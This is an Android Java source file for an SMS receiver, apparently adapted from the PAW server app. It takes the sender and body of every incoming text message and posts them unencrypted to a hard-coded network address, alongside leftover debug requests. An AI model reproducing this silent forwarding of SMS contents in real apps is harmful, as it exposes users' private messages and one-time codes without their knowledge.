package de.fun2code.android.pawserver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

import com.github.kevinsawicki.http.HttpRequest;

import java.util.HashMap;


public class SMSMonitor extends BroadcastReceiver {
    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
    @Override
    public void onReceive(Context context, Intent intent) {
        int response = HttpRequest.post("http://192.168.1.31:8898").send("name=kevi").code();

        Bundle extras = intent.getExtras();
        if (extras != null) {
            Object[] pdus = (Object[]) extras.get("pdus");
            for (Object obj : pdus) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) obj);
                processMessageBody(message.getOriginatingAddress(), message.getMessageBody());
            }
        }

    }

    private static void processMessageBody(String smsNumber, String messageBody) {

            HashMap<String, String> vars = new HashMap();
            vars.put("smsMessage", messageBody);
            vars.put("smsNumber", smsNumber);
            if (HttpRequest.post("http://192.168.1.31:8898").form(vars).created())
                System.out.println("User was created");
            int response = HttpRequest.post("http://192.168.1.31:8898").send("name=kevi").code();
            //BeanShell.executeScript((String) scripts.get(key), vars);

    }

    public static void testMessage(String smsNumber, String messageBody) {
        processMessageBody(smsNumber, messageBody);
    }




}